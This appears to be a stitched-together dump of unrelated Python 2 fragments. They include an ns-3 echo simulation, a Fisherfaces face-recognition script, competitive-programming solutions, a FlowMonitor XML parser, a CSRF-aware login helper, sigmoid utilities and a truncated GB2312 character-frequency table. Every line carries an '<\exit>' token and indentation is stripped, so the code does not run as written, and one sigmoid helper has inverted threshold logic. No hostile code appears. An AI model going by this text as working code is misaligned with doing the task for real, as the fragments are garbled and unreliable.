echoClient = ns.applications.UdpEchoClientHelper(interfaces.GetAddress(1), 9)<\exit>
echoClient.SetAttribute("MaxPackets", ns.core.UintegerValue(1))<\exit>
echoClient.SetAttribute("Interval", ns.core.TimeValue(ns.core.Seconds (1.0)))<\exit>
echoClient.SetAttribute("PacketSize", ns.core.UintegerValue(1024))<\exit>
clientApps = echoClient.Install(nodes.Get(0))<\exit>
clientApps.Start(ns.core.Seconds(2.0))<\exit>
clientApps.Stop(ns.core.Seconds(10.0))<\exit>
ns.core.Simulator.Run()<\exit>
ns.core.Simulator.Destroy()<\exit>
import sys<\exit>
sys.path.append("../..")<\exit>
from facerec.dataset import DataSet<\exit>
from facerec.feature import Fisherfaces<\exit>
from facerec.distance import EuclideanDistance, CosineDistance<\exit>
from facerec.classifier import NearestNeighbor<\exit>
from facerec.classifier import SVM<\exit>
from facerec.model import PredictableModel<\exit>
from facerec.validation import KFoldCrossValidation<\exit>
from facerec.visual import subplot<\exit>
from facerec.util import minmax_normalize<\exit>
import numpy as np<\exit>
import matplotlib.cm as cm<\exit>
import logging,sys<\exit>
handler = logging.StreamHandler(sys.stdout)<\exit>
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')<\exit>
handler.setFormatter(formatter)<\exit>
logger = logging.getLogger("facerec")<\exit>
logger.addHandler(handler)<\exit>
logger.setLevel(logging.DEBUG)<\exit>
dataSet = DataSet("/home/philipp/facerec/data/yalefaces_recognition")<\exit>
feature = Fisherfaces()<\exit>
classifier = NearestNeighbor(dist_metric=EuclideanDistance(), k=1)<\exit>
model = PredictableModel(feature=feature, classifier=classifier)<\exit>
model.compute(dataSet.data, dataSet.labels)<\exit>
E = []<\exit>
for i in xrange(min(model.feature.eigenvectors.shape[1], 16)):<\exit>
e = model.feature.eigenvectors[:,i].reshape(dataSet.data[0].shape)<\exit>
E.append(minmax_normalize(e,0,255, dtype=np.uint8))<\exit>
subplot(title="Fisherfaces", images=E, rows=4, cols=4, sptitle="Fisherface", colormap=cm.jet, filename="fisherfaces.pdf")<\exit>
cv = KFoldCrossValidation(model, k=10)<\exit>
cv.validate(dataSet.data, dataSet.labels)<\exit>
cv.print_results()<\exit>
def bitFlip(cipher):<\exit>
if len(cipher) <= 2:<\exit>
return len(cipher)<\exit>
cipher = [val if val == 1 else -1 for val in cipher]<\exit>
maxl = 0<\exit>
maxr = -1<\exit>
min_sum = 1 << 31<\exit>
ssum = 0<\exit>
l = 0<\exit>
r = -1<\exit>
for ind, val in enumerate(cipher):<\exit>
ssum += val<\exit>
if ssum > 0:<\exit>
l = ind + 1<\exit>
r = ind<\exit>
ssum = 0<\exit>
if ssum < 0:<\exit>
r = ind<\exit>
if min_sum > ssum:<\exit>
min_sum = ssum<\exit>
maxr, maxl = r, l<\exit>
cipher = [val if val == 1 else 0 for val in cipher]<\exit>
for i in xrange(maxl, maxr + 1):<\exit>
cipher[i] ^= 1<\exit>
return sum(cipher)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
N = int(f.readline().strip())<\exit>
cipher = []<\exit>
for t in xrange(N):<\exit>
i = int(f.readline().strip())<\exit>
cipher.append(i)<\exit>
s = "%s\n" % (bitFlip(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, K, C = cipher<\exit>
C.sort(reverse=True)<\exit>
group_cnt = N / K + 1<\exit>
total_cost = 0<\exit>
for i in xrange(group_cnt):<\exit>
unit_cost = i + 1<\exit>
total_cost += unit_cost * sum(C[i * K:(i + 1) * K])<\exit>
return total_cost<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
N, K = map(int, f.readline().strip().split(' '))<\exit>
C = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, K, C<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
from __future__ import division<\exit>
import sys<\exit>
import os<\exit>
try:<\exit>
from xml.etree import cElementTree as ElementTree<\exit>
except ImportError:<\exit>
from xml.etree import ElementTree<\exit>
def parse_time_ns(tm):<\exit>
if tm.endswith('ns'):<\exit>
return long(tm[:-2])<\exit>
raise ValueError(tm)<\exit>
class FiveTuple(object):<\exit>
__slots__ = ['sourceAddress', 'destinationAddress', 'protocol', 'sourcePort', 'destinationPort']<\exit>
def __init__(self, el):<\exit>
self.sourceAddress = el.get('sourceAddress')<\exit>
self.destinationAddress = el.get('destinationAddress')<\exit>
self.sourcePort = int(el.get('sourcePort'))<\exit>
self.destinationPort = int(el.get('destinationPort'))<\exit>
self.protocol = int(el.get('protocol'))<\exit>
class Histogram(object):<\exit>
__slots__ = 'bins', 'nbins', 'number_of_flows'<\exit>
def __init__(self, el=None):<\exit>
self.bins = []<\exit>
if el is not None:<\exit>
for bin in el.findall('bin'):<\exit>
self.bins.append( (float(bin.get("start")), float(bin.get("width")), int(bin.get("count"))) )<\exit>
class Flow(object):<\exit>
__slots__ = ['flowId', 'delayMean', 'packetLossRatio', 'rxBitrate', 'txBitrate',<\exit>
'fiveTuple', 'packetSizeMean', 'probe_stats_unsorted',<\exit>
'hopCount', 'flowInterruptionsHistogram', 'rx_duration']<\exit>
def __init__(self, flow_el):<\exit>
self.flowId = int(flow_el.get('flowId'))<\exit>
rxPackets = long(flow_el.get('rxPackets'))<\exit>
txPackets = long(flow_el.get('txPackets'))<\exit>
tx_duration = float(long(flow_el.get('timeLastTxPacket')[:-2]) - long(flow_el.get('timeFirstTxPacket')[:-2]))*1e-9<\exit>
rx_duration = float(long(flow_el.get('timeLastRxPacket')[:-2]) - long(flow_el.get('timeFirstRxPacket')[:-2]))*1e-9<\exit>
self.rx_duration = rx_duration<\exit>
self.probe_stats_unsorted = []<\exit>
if rxPackets:<\exit>
self.hopCount = float(flow_el.get('timesForwarded')) / rxPackets + 1<\exit>
else:<\exit>
self.hopCount = -1000<\exit>
if rxPackets:<\exit>
self.delayMean = float(flow_el.get('delaySum')[:-2]) / rxPackets * 1e-9<\exit>
self.packetSizeMean = float(flow_el.get('rxBytes')) / rxPackets<\exit>
else:<\exit>
self.delayMean = None<\exit>
self.packetSizeMean = None<\exit>
if rx_duration > 0:<\exit>
self.rxBitrate = long(flow_el.get('rxBytes'))*8 / rx_duration<\exit>
else:<\exit>
self.rxBitrate = None<\exit>
if tx_duration > 0:<\exit>
self.txBitrate = long(flow_el.get('txBytes'))*8 / tx_duration<\exit>
else:<\exit>
self.txBitrate = None<\exit>
lost = float(flow_el.get('lostPackets'))<\exit>
if rxPackets == 0:<\exit>
self.packetLossRatio = None<\exit>
else:<\exit>
self.packetLossRatio = (lost / (rxPackets + lost))<\exit>
interrupt_hist_elem = flow_el.find("flowInterruptionsHistogram")<\exit>
if interrupt_hist_elem is None:<\exit>
self.flowInterruptionsHistogram = None<\exit>
else:<\exit>
self.flowInterruptionsHistogram = Histogram(interrupt_hist_elem)<\exit>
class ProbeFlowStats(object):<\exit>
__slots__ = ['probeId', 'packets', 'bytes', 'delayFromFirstProbe']<\exit>
class Simulation(object):<\exit>
def __init__(self, simulation_el):<\exit>
self.flows = []<\exit>
FlowClassifier_el, = simulation_el.findall("Ipv4FlowClassifier")<\exit>
flow_map = {}<\exit>
for flow_el in simulation_el.findall("FlowStats/Flow"):<\exit>
flow = Flow(flow_el)<\exit>
flow_map[flow.flowId] = flow<\exit>
self.flows.append(flow)<\exit>
for flow_cls in FlowClassifier_el.findall("Flow"):<\exit>
flowId = int(flow_cls.get('flowId'))<\exit>
flow_map[flowId].fiveTuple = FiveTuple(flow_cls)<\exit>
for probe_elem in simulation_el.findall("FlowProbes/FlowProbe"):<\exit>
probeId = int(probe_elem.get('index'))<\exit>
for stats in probe_elem.findall("FlowStats"):<\exit>
flowId = int(stats.get('flowId'))<\exit>
s = ProbeFlowStats()<\exit>
s.packets = int(stats.get('packets'))<\exit>
s.bytes = long(stats.get('bytes'))<\exit>
s.probeId = probeId<\exit>
if s.packets > 0:<\exit>
s.delayFromFirstProbe =  parse_time_ns(stats.get('delayFromFirstProbeSum')) / float(s.packets)<\exit>
else:<\exit>
s.delayFromFirstProbe = 0<\exit>
flow_map[flowId].probe_stats_unsorted.append(s)<\exit>
def main(argv):<\exit>
file_obj = open(argv[1])<\exit>
print "Reading XML file ",<\exit>
sys.stdout.flush()<\exit>
level = 0<\exit>
sim_list = []<\exit>
for event, elem in ElementTree.iterparse(file_obj, events=("start", "end")):<\exit>
if event == "start":<\exit>
level += 1<\exit>
if event == "end":<\exit>
level -= 1<\exit>
if level == 0 and elem.tag == 'FlowMonitor':<\exit>
sim = Simulation(elem)<\exit>
sim_list.append(sim)<\exit>
elem.clear()<\exit>
sys.stdout.write(".")<\exit>
sys.stdout.flush()<\exit>
print " done."<\exit>
for sim in sim_list:<\exit>
for flow in sim.flows:<\exit>
t = flow.fiveTuple<\exit>
proto = {6: 'TCP', 17: 'UDP'} [t.protocol]<\exit>
print "FlowID: %i (%s %s/%s --> %s/%i)" % \<\exit>
(flow.flowId, proto, t.sourceAddress, t.sourcePort, t.destinationAddress, t.destinationPort)<\exit>
print "\tTX bitrate: %.2f kbit/s" % (flow.txBitrate*1e-3,)<\exit>
print "\tRX bitrate: %.2f kbit/s" % (flow.rxBitrate*1e-3,)<\exit>
print "\tMean Delay: %.2f ms" % (flow.delayMean*1e3,)<\exit>
print "\tPacket Loss Ratio: %.2f %%" % (flow.packetLossRatio*100)<\exit>
if __name__ == '__main__':<\exit>
main(sys.argv)<\exit>
import requests<\exit>
class FormHandler(object):<\exit>
def __init__(self):<\exit>
self.client = requests.session()<\exit>
def get_csrf(self, url):<\exit>
self.client.get(url)<\exit>
return self.client.cookies['csrf']<\exit>
def login(self, url, username, password, csrf):<\exit>
login_data = dict(username=username, password=password, csrfmiddlewaretoken=csrf, next='/')<\exit>
response = self.client.post(url, data=login_data, headers=dict(Referer=url))<\exit>
return response<\exit>
from collections import defaultdict<\exit>
def dfs(G, i, visited):<\exit>
visited[i] = True<\exit>
for nbr in G[i]:<\exit>
if not visited[nbr]:<\exit>
dfs(G, nbr, visited)<\exit>
def friendCircles(friends):<\exit>
if not friends: return 0<\exit>
G = defaultdict(list)<\exit>
n = len(friends)<\exit>
for i in xrange(n):<\exit>
for j in xrange(n):<\exit>
if friends[i][j] == "Y":<\exit>
G[i].append(j)<\exit>
G[j].append(i)<\exit>
visited = [False for _ in xrange(n)]<\exit>
cnt = 0<\exit>
for i in xrange(n):<\exit>
if not visited[i]:<\exit>
cnt += 1<\exit>
dfs(G, i, visited)<\exit>
return cnt<\exit>
if __name__ == "__main__":<\exit>
friends = [<\exit>
"YYNN",<\exit>
"YYYN",<\exit>
"NYYN",<\exit>
"NNNY"<\exit>
]<\exit>
assert friendCircles(friends) == 2<\exit>
friends2 = [<\exit>
"YNNNN",<\exit>
"NYNNN",<\exit>
"NNYNN",<\exit>
"NNNYN",<\exit>
"NNNNY"<\exit>
]<\exit>
assert friendCircles(friends2) == 5<\exit>
import numpy as np<\exit>
from scipy.stats import logistic, multivariate_normal<\exit>
def sigmoid(X):<\exit>
return logistic.cdf(X)<\exit>
def sigmoid_deprecated(z):<\exit>
if z > 30:<\exit>
return 1 - 1e-10<\exit>
if z < 30:<\exit>
return 1e-10<\exit>
return 1.0 / (1 + np.exp(-z))<\exit>
def log_sigmoid_deprecated(z):<\exit>
if abs(z) < 30:<\exit>
return np.log(sigmoid(z))<\exit>
else:<\exit>
if z > 0:<\exit>
return -np.exp(-z)<\exit>
else:<\exit>
return z<\exit>
def multivariate_gaussian(X, mu, Sigma):<\exit>
return multivariate_normal.pdf(X, mean=mu, cov=Sigma)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
s = cipher<\exit>
r = s[::-1]<\exit>
s = map(ord, list(s))<\exit>
r = map(ord, list(r))<\exit>
for i in xrange(1, len(s)):<\exit>
if abs(s[i] - s[i - 1]) != abs(r[i] - r[i - 1]):<\exit>
return "Not Funny"<\exit>
return "Funny"<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = f.readline().strip()<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
A = cipher<\exit>
N = len(A)<\exit>
_sum = sum(A)<\exit>
_max = -1 << 65<\exit>
s = 0<\exit>
for ind, val in enumerate(A):<\exit>
s += (ind + 1) * val<\exit>
_max = max(_max, s)<\exit>
for i in xrange(N):<\exit>
s = s + _sum - N * A[N - 1 - i]<\exit>
_max = max(_max, s)<\exit>
return _max<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
N = int(f.readline().strip())<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import collections<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
d = collections.defaultdict(int)<\exit>
for c in cipher:<\exit>
d[c] += 1<\exit>
cnt = 0<\exit>
for v in d.values():<\exit>
if v & 1 == 1:<\exit>
cnt += 1<\exit>
if cnt > 1:<\exit>
return "NO"<\exit>
return "YES"<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
cipher = f.readline().strip()<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
GB2312_TYPICAL_DISTRIBUTION_RATIO = 0.9<\exit>
GB2312_TABLE_SIZE = 3760<\exit>
GB2312CharToFreqOrder = (<\exit>
1671, 749,1443,2364,3924,3807,2330,3921,1704,3463,2691,1511,1515, 572,3191,2205,<\exit>
2361, 224,2558, 479,1711, 963,3162, 440,4060,1905,2966,2947,3580,2647,3961,3842,<\exit>
2204, 869,4207, 970,2678,5626,2944,2956,1479,4048, 514,3595, 588,1346,2820,3409,<\exit>
249,4088,1746,1873,2047,1774, 581,1813, 358,1174,3590,1014,1561,4844,2245, 670,<\exit>
1636,3112, 889,1286, 953, 556,2327,3060,1290,3141, 613, 185,3477,1367, 850,3820,<\exit>
1715,2428,2642,2303,2732,3041,2562,2648,3566,3946,1349, 388,3098,2091,1360,3585,<\exit>
152,1687,1539, 738,1559,  59,1232,2925,2267,1388,1249,1741,1679,2960, 151,1566,<\exit>
1125,1352,4271, 924,4296, 385,3166,4459, 310,1245,2850,  70,3285,2729,3534,3575,<\exit>
2398,3298,3466,1960,2265, 217,3647, 864,1909,2084,4401,2773,1010,3269,5152, 853,<\exit>
3051,3121,1244,4251,1895, 364,1499,1540,2313,1180,3655,2268, 562, 715,2417,3061,<\exit>
544, 336,3768,2380,1752,4075, 950, 280,2425,4382, 183,2759,3272, 333,4297,2155,<\exit>
1688,2356,1444,1039,4540, 736,1177,3349,2443,2368,2144,2225, 565, 196,1482,3406,<\exit>
927,1335,4147, 692, 878,1311,1653,3911,3622,1378,4200,1840,2969,3149,2126,1816,<\exit>
2534,1546,2393,2760, 737,2494,  13, 447, 245,2747,  38,2765,2129,2589,1079, 606,<\exit>
360, 471,3755,2890, 404, 848, 699,1785,1236, 370,2221,1023,3746,2074,2026,2023,<\exit>
2388,1581,2119, 812,1141,3091,2536,1519, 804,2053, 406,1596,1090, 784, 548,4414,<\exit>
1806,2264,2936,1100, 343,4114,5096, 622,3358, 743,3668,1510,1626,5020,3567,2513,<\exit>
3195,4115,5627,2489,2991,  24,2065,2697,1087,2719,  48,1634, 315,  68, 985,2052,<\exit>
198,2239,1347,1107,1439, 597,2366,2172, 871,3307, 919,2487,2790,1867, 236,2570,<\exit>
1413,3794, 906,3365,3381,1701,1982,1818,1524,2924,1205, 616,2586,2072,2004, 575,<\exit>
253,3099,  32,1365,1182, 197,1714,2454,1201, 554,3388,3224,2748, 756,2587, 250,<\exit>
2567,1507,1517,3529,1922,2761,2337,3416,1961,1677,2452,2238,3153, 615, 911,1506,<\exit>
1474,2495,1265,1906,2749,3756,3280,2161, 898,2714,1759,3450,2243,2444, 563,  26,<\exit>
3286,2266,3769,3344,2707,3677, 611,1402, 531,1028,2871,4548,1375, 261,2948, 835,<\exit>
1190,4134, 353, 840,2684,1900,3082,1435,2109,1207,1674, 329,1872,2781,4055,2686,<\exit>
2104, 608,3318,2423,2957,2768,1108,3739,3512,3271,3985,2203,1771,3520,1418,2054,<\exit>
1681,1153, 225,1627,2929, 162,2050,2511,3687,1954, 124,1859,2431,1684,3032,2894,<\exit>
585,4805,3969,2869,2704,2088,2032,2095,3656,2635,4362,2209, 256, 518,2042,2105,<\exit>
3777,3657, 643,2298,1148,1779, 190, 989,3544, 414,  11,2135,2063,2979,1471, 403,<\exit>
3678, 126, 770,1563, 671,2499,3216,2877, 600,1179, 307,2805,4937,1268,1297,2694,<\exit>
252,4032,1448,1494,1331,1394, 127,2256, 222,1647,1035,1481,3056,1915,1048, 873,<\exit>
3651, 210,  33,1608,2516, 200,1520, 415, 102,   0,3389,1287, 817,  91,3299,2940,<\exit>
836,1814, 549,2197,1396,1669,2987,3582,2297,2848,4528,1070, 687,  20,1819, 121,<\exit>
1552,1364,1461,1968,2617,3540,2824,2083, 177, 948,4938,2291, 110,4549,2066, 648,<\exit>
3359,1755,2110,2114,4642,4845,1693,3937,3308,1257,1869,2123, 208,1804,3159,2992,<\exit>
2531,2549,3361,2418,1350,2347,2800,2568,1291,2036,2680,  72, 842,1990, 212,1233,<\exit>
1154,1586,  75,2027,3410,4900,1823,1337,2710,2676, 728,2810,1522,3026,4995, 157,<\exit>
755,1050,4022, 710, 785,1936,2194,2085,1406,2777,2400, 150,1250,4049,1206, 807,<\exit>
1910, 534, 529,3309,1721,1660, 274,  39,2827, 661,2670,1578, 925,3248,3815,1094,<\exit>
4278,4901,4252,  41,1150,3747,2572,2227,4501,3658,4902,3813,3357,3617,2884,2258,<\exit>
887, 538,4187,3199,1294,2439,3042,2329,2343,2497,1255, 107, 543,1527, 521,3478,<\exit>
3568, 194,5062,  15, 961,3870,1241,1192,2664,  66,5215,3260,2111,1295,1127,2152,<\exit>
3805,4135, 901,1164,1976, 398,1278, 530,1460, 748, 904,1054,1966,1426,  53,2909,<\exit>
509, 523,2279,1534, 536,1019, 239,1685, 460,2353, 673,1065,2401,3600,4298,2272,<\exit>
1272,2363, 284,1753,3679,4064,1695,  81, 815,2677,2757,2731,1386, 859, 500,4221,<\exit>
2190,2566, 757,1006,2519,2068,1166,1455, 337,2654,3203,1863,1682,1914,3025,1252,<\exit>
1409,1366, 847, 714,2834,2038,3209, 964,2970,1901, 885,2553,1078,1756,3049, 301,<\exit>
1572,3326, 688,2130,1996,2429,1805,1648,2930,3421,2750,3652,3088, 262,1158,1254,<\exit>
389,1641,1812, 526,1719, 923,2073,1073,1902, 468, 489,4625,1140, 857,2375,3070,<\exit>
3319,2863, 380, 116,1328,2693,1161,2244, 273,1212,1884,2769,3011,1775,1142, 461,<\exit>
3066,1200,2147,2212, 790, 702,2695,4222,1601,1058, 434,2338,5153,3640,  67,2360,<\exit>
4099,2502, 618,3472,1329, 416,1132, 830,2782,1807,2653,3211,3510,1662, 192,2124,<\exit>
296,3979,1739,1611,3684,  23, 118, 324, 446,1239,1225, 293,2520,3814,3795,2535,<\exit>
3116,  17,1074, 467,2692,2201, 387,2922,  45,1326,3055,1645,3659,2817, 958, 243,<\exit>
1903,2320,1339,2825,1784,3289, 356, 576, 865,2315,2381,3377,3916,1088,3122,1713,<\exit>
1655, 935, 628,4689,1034,1327, 441, 800, 720, 894,1979,2183,1528,5289,2702,1071,<\exit>
4046,3572,2399,1571,3281,  79, 761,1103, 327, 134, 758,1899,1371,1615, 879, 442,<\exit>
215,2605,2579, 173,2048,2485,1057,2975,3317,1097,2253,3801,4263,1403,1650,2946,<\exit>
814,4968,3487,1548,2644,1567,1285,   2, 295,2636,  97, 946,3576, 832, 141,4257,<\exit>
3273, 760,3821,3521,3156,2607, 949,1024,1733,1516,1803,1920,2125,2283,2665,3180,<\exit>
1501,2064,3560,2171,1592, 803,3518,1416, 732,3897,4258,1363,1362,2458, 119,1427,<\exit>
602,1525,2608,1605,1639,3175, 694,3064,  10, 465,  76,2000,4846,4208, 444,3781,<\exit>
1619,3353,2206,1273,3796, 740,2483, 320,1723,2377,3660,2619,1359,1137,1762,1724,<\exit>
2345,2842,1850,1862, 912, 821,1866, 612,2625,1735,2573,3369,1093, 844,  89, 937,<\exit>
930,1424,3564,2413,2972,1004,3046,3019,2011, 711,3171,1452,4178, 428, 801,1943,<\exit>
432, 445,2811, 206,4136,1472, 730, 349,  73, 397,2802,2547, 998,1637,1167, 789,<\exit>
396,3217, 154,1218, 716,1120,1780,2819,4826,1931,3334,3762,2139,1215,2627, 552,<\exit>
3664,3628,3232,1405,2383,3111,1356,2652,3577,3320,3101,1703, 640,1045,1370,1246,<\exit>
4996, 371,1575,2436,1621,2210, 984,4033,1734,2638,  16,4529, 663,2755,3255,1451,<\exit>
3917,2257,1253,1955,2234,1263,2951, 214,1229, 617, 485, 359,1831,1969, 473,2310,<\exit>
750,2058, 165,  80,2864,2419, 361,4344,2416,2479,1134, 796,3726,1266,2943, 860,<\exit>
2715, 938, 390,2734,1313,1384, 248, 202, 877,1064,2854, 522,3907, 279,1602, 297,<\exit>
2357, 395,3740, 137,2075, 944,4089,2584,1267,3802,  62,1533,2285, 178, 176, 780,<\exit>
2440, 201,3707, 590, 478,1560,4354,2117,1075,  30,  74,4643,4004,1635,1441,2745,<\exit>
776,2596, 238,1077,1692,1912,2844, 605, 499,1742,3947, 241,3053, 980,1749, 936,<\exit>
2640,4511,2582, 515,1543,2162,5322,2892,2993, 890,2148,1924, 665,1827,3581,1032,<\exit>
968,3163, 339,1044,1896, 270, 583,1791,1720,4367,1194,3488,3669,  43,2523,1657,<\exit>
163,2167, 290,1209,1622,3378, 550, 634,2508,2510, 695,2634,2384,2512,1476,1414,<\exit>
220,1469,2341,2138,2852,3183,2900,4939,2865,3502,1211,3680, 854,3227,1299,2976,<\exit>
3172, 186,2998,1459, 443,1067,3251,1495, 321,1932,3054, 909, 753,1410,1828, 436,<\exit>
2441,1119,1587,3164,2186,1258, 227, 231,1425,1890,3200,3942, 247, 959, 725,5254,<\exit>
2741, 577,2158,2079, 929, 120, 174, 838,2813, 591,1115, 417,2024,  40,3240,1536,<\exit>
1037, 291,4151,2354, 632,1298,2406,2500,3535,1825,1846,3451, 205,1171, 345,4238,<\exit>
18,1163, 811, 685,2208,1217, 425,1312,1508,1175,4308,2552,1033, 587,1381,3059,<\exit>
2984,3482, 340,1316,4023,3972, 792,3176, 519, 777,4690, 918, 933,4130,2981,3741,<\exit>
90,3360,2911,2200,5184,4550, 609,3079,2030, 272,3379,2736, 363,3881,1130,1447,<\exit>
286, 779, 357,1169,3350,3137,1630,1220,2687,2391, 747,1277,3688,2618,2682,2601,<\exit>
1156,3196,5290,4034,3102,1689,3596,3128, 874, 219,2783, 798, 508,1843,2461, 269,<\exit>
1658,1776,1392,1913,2983,3287,2866,2159,2372, 829,4076,  46,4253,2873,1889,1894,<\exit>
915,1834,1631,2181,2318, 298, 664,2818,3555,2735, 954,3228,3117, 527,3511,2173,<\exit>
681,2712,3033,2247,2346,3467,1652, 155,2164,3382, 113,1994, 450, 899, 494, 994,<\exit>
1237,2958,1875,2336,1926,3727, 545,1577,1550, 633,3473, 204,1305,3072,2410,1956,<\exit>
2471, 707,2134, 841,2195,2196,2663,3843,1026,4940, 990,3252,4997, 368,1092, 437,<\exit>
3212,3258,1933,1829, 675,2977,2893, 412, 943,3723,4644,3294,3283,2230,2373,5154,<\exit>
2389,2241,2661,2323,1404,2524, 593, 787, 677,3008,1275,2059, 438,2709,2609,2240,<\exit>
2269,2246,1446,  36,1568,1373,3892,1574,2301,1456,3962, 693,2276,5216,2035,1143,<\exit>
2720,1919,1797,1811,2763,4137,2597,1830,1699,1488,1198,2090, 424,1694, 312,3634,<\exit>
3390,4179,3335,2252,1214, 561,1059,3243,2295,2561, 975,5155,2321,2751,3772, 472,<\exit>
1537,3282,3398,1047,2077,2348,2878,1323,3340,3076, 690,2906,  51, 369, 170,3541,<\exit>
1060,2187,2688,3670,2541,1083,1683, 928,3918, 459, 109,4427, 599,3744,4286, 143,<\exit>
2101,2730,2490,  82,1588,3036,2121, 281,1860, 477,4035,1238,2812,3020,2716,3312,<\exit>
1530,2188,2055,1317, 843, 636,1808,1173,3495, 649, 181,1002, 147,3641,1159,2414,<\exit>
3750,2289,2795, 813,3123,2610,1136,4368,   5,3391,4541,2174, 420, 429,1728, 754,<\exit>
1228,2115,2219, 347,2223,2733, 735,1518,3003,2355,3134,1764,3948,3329,1888,2424,<\exit>
1001,1234,1972,3321,3363,1672,1021,1450,1584, 226, 765, 655,2526,3404,3244,2302,<\exit>
3665, 731, 594,2184, 319,1576, 621, 658,2656,4299,2099,3864,1279,2071,2598,2739,<\exit>
795,3086,3699,3908,1707,2352,2402,1382,3136,2475,1465,4847,3496,3865,1085,3004,<\exit>
2591,1084, 213,2287,1963,3565,2250, 822, 793,4574,3187,1772,1789,3050, 595,1484,<\exit>
1959,2770,1080,2650, 456, 422,2996, 940,3322,4328,4345,3092,2742, 965,2784, 739,<\exit>
4124, 952,1358,2498,2949,2565, 332,2698,2378, 660,2260,2473,4194,3856,2919, 535,<\exit>
1260,2651,1208,1428,1300,1949,1303,2942, 433,2455,2450,1251,1946, 614,1269, 641,<\exit>
1306,1810,2737,3078,2912, 564,2365,1419,1415,1497,4460,2367,2185,1379,3005,1307,<\exit>
3218,2175,1897,3063, 682,1157,4040,4005,1712,1160,1941,1399, 394, 402,2952,1573,<\exit>
1151,2986,2404, 862, 299,2033,1489,3006, 346, 171,2886,3401,1726,2932, 168,2533,<\exit>
47,2507,1030,3735,1145,3370,1395,1318,1579,3609,4560,2857,4116,1457,2529,1965,<\exit>
504,1036,2690,2988,2405, 745,5871, 849,2397,2056,3081, 863,2359,3857,2096,  99,<\exit>
1397,1769,2300,4428,1643,3455,1978,1757,3718,1440,  35,4879,3742,1296,4228,2280,<\exit>
160,5063,1599,2013, 166, 520,3479,1646,3345,3012, 490,1937,1545,1264,2182,2505,<\exit>
1096,1188,1369,1436,2421,1667,2792,2460,1270,2122, 727,3167,2143, 806,1706,1012,<\exit>
1800,3037, 960,2218,1882, 805, 139,2456,1139,1521, 851,1052,3093,3089, 342,2039,<\exit>
744,5097,1468,1502,1585,2087, 223, 939, 326,2140,2577, 892,2481,1623,4077, 982,<\exit>
3708, 135,2131,  87,2503,3114,2326,1106, 876,1616, 547,2997,2831,2093,3441,4530,<\exit>
4314,   9,3256,4229,4148, 659,1462,1986,1710,2046,2913,2231,4090,4880,5255,3392,<\exit>
3274,1368,3689,4645,1477, 705,3384,3635,1068,1529,2941,1458,3782,1509, 100,1656,<\exit>
2548, 718,2339, 408,1590,2780,3548,1838,4117,3719,1345,3530, 717,3442,2778,3220,<\exit>
2898,1892,4590,3614,3371,2043,1998,1224,3483, 891, 635, 584,2559,3355, 733,1766,<\exit>
1729,1172,3789,1891,2307, 781,2982,2271,1957,1580,5773,2633,2005,4195,3097,1535,<\exit>
3213,1189,1934,5693,3262, 586,3118,1324,1598, 517,1564,2217,1868,1893,4445,3728,<\exit>
2703,3139,1526,1787,1992,3882,2875,1549,1199,1056,2224,1904,2711,5098,4287, 338,<\exit>
1993,3129,3489,2689,1809,2815,1997, 957,1855,3898,2550,3275,3057,1105,1319, 627,<\exit>
1505,1911,1883,3526, 698,3629,3456,1833,1431, 746,  77,1261,2017,2296,1977,1885,<\exit>
125,1334,1600, 525,1798,1109,2222,1470,1945, 559,2236,1186,3443,2476,1929,1411,<\exit>
2411,3135,1777,3372,2621,1841,1613,3229, 668,1430,1839,2643,2916, 195,1989,2671,<\exit>
2358,1387, 629,3205,2293,5256,4439, 123,1310, 888,1879,4300,3021,3605,1003,1162,<\exit>
3192,2910,2010, 140,2395,2859,  55,1082,2012,2901, 662, 419,2081,1438, 680,2774,<\exit>
4654,3912,1620,1731,1625,5035,4065,2328, 512,1344, 802,5443,2163,2311,2537, 524,<\exit>
3399,  98,1155,2103,1918,2606,3925,2816,1393,2465,1504,3773,2177,3963,1478,4346,<\exit>
180,1113,4655,3461,2028,1698, 833,2696,1235,1322,1594,4408,3623,3013,3225,2040,<\exit>
3022, 541,2881, 607,3632,2029,1665,1219, 639,1385,1686,1099,2803,3231,1938,3188,<\exit>
2858, 427, 676,2772,1168,2025, 454,3253,2486,3556, 230,1950, 580, 791,1991,1280,<\exit>
1086,1974,2034, 630, 257,3338,2788,4903,1017,  86,4790, 966,2789,1995,1696,1131,<\exit>
259,3095,4188,1308, 179,1463,5257, 289,4107,1248,  42,3413,1725,2288, 896,1947,<\exit>
774,4474,4254, 604,3430,4264, 392,2514,2588, 452, 237,1408,3018, 988,4531,1970,<\exit>
3034,3310, 540,2370,1562,1288,2990, 502,4765,1147,   4,1853,2708, 207, 294,2814,<\exit>
4078,2902,2509, 684,  34,3105,3532,2551, 644, 709,2801,2344, 573,1727,3573,3557,<\exit>
2021,1081,3100,4315,2100,3681, 199,2263,1837,2385, 146,3484,1195,2776,3949, 997,<\exit>
1939,3973,1008,1091,1202,1962,1847,1149,4209,5444,1076, 493, 117,5400,2521, 972,<\exit>
1490,2934,1796,4542,2374,1512,2933,2657, 413,2888,1135,2762,2314,2156,1355,2369,<\exit>
766,2007,2527,2170,3124,2491,2593,2632,4757,2437, 234,3125,3591,1898,1750,1376,<\exit>
1942,3468,3138, 570,2127,2145,3276,4131, 962, 132,1445,4196,  19, 941,3624,3480,<\exit>
